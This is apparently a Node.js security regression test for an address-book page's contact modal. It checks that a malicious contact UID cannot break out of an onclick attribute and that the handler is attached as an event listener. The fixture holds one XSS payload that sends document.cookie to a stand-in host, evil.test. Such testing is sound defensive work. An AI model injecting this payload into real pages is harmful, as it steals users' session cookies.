// Runs addressbook_view.html's own showContactModal over a contact whose UID
// is a JavaScript breakout, and checks that the UID never becomes markup.
//
// escapeHtml cannot protect an onclick attribute: the HTML attribute-value
// parser decodes &#39; back to an apostrophe before the attribute's JavaScript
// is compiled, so the escape is undone by the very parser it was meant to
// survive. The only arrangement that holds is not to build executable markup
// out of data, so this asserts the handler is attached to an element instead.
//
// Usage: node contact_modal_wiring.mjs addressbook_view.html safe_html_js.tmpl
import fs from 'node:fs';
import vm from 'node:vm';
import assert from 'node:assert/strict';

const source = process.argv.slice(2).map((path) => fs.readFileSync(path, 'utf8')).join('\n');

function extract(name) {
  const start = source.indexOf('function ' + name + '(');
  assert.ok(start >= 0, `missing ${name}`);
  let depth = 0, end = source.indexOf('{', start);
  for (; end < source.length; end++) {
    if (source[end] === '{') depth++;
    if (source[end] === '}' && --depth === 0) break;
  }
  return source.slice(start, end + 1);
}

const assignedMarkup = [];
const listeners = [];

function element(tag) {
  const node = {
    tagName: tag,
    children: [],
    classList: { add() {}, remove() {} },
    style: {},
    set innerHTML(value) {
      this._html = String(value);
      assignedMarkup.push({ id: this.id, tag, html: this._html });
    },
    get innerHTML() { return this._html || ''; },
    set textContent(value) { this._text = String(value); },
    get textContent() { return this._text || ''; },
    appendChild(child) { this.children.push(child); return child; },
    addEventListener(type, handler) { listeners.push({ node, type, handler }); },
  };
  return node;
}

const byId = {};
const context = {
  document: {
    createElement: element,
    getElementById(id) {
      if (!byId[id]) {
        byId[id] = element('div');
        byId[id].id = id;
      }
      return byId[id];
    },
  },
  URL,
  window: { canEditAddressBook: true },
  editCalls: [],
};
context.window.window = context.window;
context.globalThis = context;

vm.runInNewContext(
  [
    extract('escapeHtml'),
    extract('safeUrl'),
    extract('contactPhotoSrc'),
    extract('websiteHref'),
    extract('formatVCardDate'),
    extract('getInitials'),
    extract('formatAddress'),
    'function showEditContactModal(c) { editCalls.push(c); }',
    "var modal = document.getElementById('contact-modal');",
    extract('showContactModal'),
    'globalThis._showContactModal = showContactModal;',
  ].join('\n'),
  context,
);

const uid = "a'+fetch('//evil.test/?c='+document.cookie)+'";
const contact = {
  uid,
  fn: 'Ada Lovelace',
  org: '',
  title: '',
  photo: '',
  note: '',
  bday: null,
  anniversary: null,
  phones: [],
  emails: [],
  addresses: [],
  urls: [],
  dates: [],
  relations: [],
  impp: [],
  categories: [],
};

context._showContactModal(contact);

assert.ok(assignedMarkup.length > 0, 'showContactModal assigned no markup');
for (const { id, html } of assignedMarkup) {
  // Neither the raw UID nor any escaping of it belongs in markup: an attribute
  // parser undoes the escaping, so the only inert form is no form at all.
  assert.ok(!html.includes('fetch('), `the UID reached the markup of #${id}: ${html}`);
  assert.ok(!html.includes('document.cookie'), `the UID reached the markup of #${id}: ${html}`);
  assert.ok(
    !/\son[a-z]+\s*=/i.test(html),
    `#${id} markup carries an event-handler attribute, which data must never be built into: ${html}`,
  );
}

const clicks = listeners.filter((l) => l.type === 'click');
assert.equal(clicks.length, 1, `expected one click handler on the edit button, got ${clicks.length}`);
assert.equal(clicks[0].node.textContent, 'Edit Contact', 'the click handler is not on the edit button');

clicks[0].handler();
assert.equal(context.editCalls.length, 1, 'the edit button did not open the editor');
assert.equal(
  context.editCalls[0],
  contact,
  'the edit button opened a different contact than the one the modal is showing',
);

// The button has to be in the modal body, not stranded on a detached node.
const modalBody = byId['modal-body'];
assert.ok(modalBody, 'showContactModal never looked up the modal body');
const inBody = (node) => node === clicks[0].node || node.children.some(inBody);
assert.ok(inBody(modalBody), 'the edit button was never appended to the modal body');
